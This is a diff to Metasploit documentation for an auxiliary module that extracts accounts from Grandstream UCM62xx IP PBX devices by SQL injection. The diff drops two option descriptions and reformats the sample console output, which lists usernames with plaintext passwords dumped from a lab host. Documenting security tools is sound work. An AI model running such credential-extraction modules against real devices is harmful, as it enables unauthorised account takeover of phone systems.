@@ -33,17 +33,6 @@ However, if you have a device, affected firmware can be downloaded here:
 
 Specifies base URI. The default value is `/`.
 
-### ID_SCAN
-
-Indicates the total number of user IDs to scan for. The module starts by scanning the
-database for valid user ids. The IDs are sequential starting at 0. The default
-scans the first 30 IDs which would be 0 - 29.
-
-### STRING_FIELD_LENGTH
-
-Indicates the maximum length of the string fields (username and password) that
-we'll allow for in our SQLi guessing.
-
 ## Scenarios
 
 ### Grandstream UCM6202 IP PBX firmware version 1.0.20.20
@@ -58,7 +47,6 @@ Module options (auxiliary/scanner/http/grandstream_ucm62xx_sql_account_guess):
 
    Name       Current Setting  Required  Description
    ----       ---------------  --------  -----------
-   ID_SCAN    30               yes       The number of initial user ids to scan
    Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
    RHOSTS     10.0.0.9         yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit
    RPORT      8089             yes       The target port (TCP)
@@ -67,24 +55,15 @@ Module options (auxiliary/scanner/http/grandstream_ucm62xx_sql_account_guess):
    THREADS    1                yes       The number of concurrent threads (max one per host)
    VHOST                       no        HTTP server virtual host
 
-msf6 auxiliary(scanner/http/grandstream_ucm62xx_sql_account_guess) > run
-
 [*] Requesting version information from /cgi
 [*] The reported version is: 1.0.20.20
-[*] Found 6 valid user ids
-[*] Found username: admin
-[*] Found password: cheesed00dle
-[*] Found username: 1000
-[*] Found password: gZ15S8O8U5S72oli
-[*] Found username: 1001
-[*] Found password: qK6uRxwC
-[*] Found username: 1002
-[*] Found password: aP9ux515W7p5U
-[*] Found username: 1003
-[*] Found password: pM6mo!E8u37k
-[*] Found username: 1004
-[*] Found password: mC7N68dm8h
+[*] Found the following username and password: admin - cheesed00dle
+[*] Found the following username and password: 1000 - gZ15S8O8U5S72oli
+[*] Found the following username and password: 1001 - qK6uRxwC
+[*] Found the following username and password: 1002 - aP9ux515W7p5U
+[*] Found the following username and password: 1003 - pM6mo!E8u37k
+[*] Found the following username and password: 1004 - mC7N68dm8h
 [*] Scanned 1 of 1 hosts (100% complete)
 [*] Auxiliary module execution completed
-msf6 auxiliary(scanner/http/grandstream_ucm62xx_sql_account_guess) > 
+msf6 auxiliary(scanner/http/grandstream_ucm62xx_sql_account_guess) >
 ```
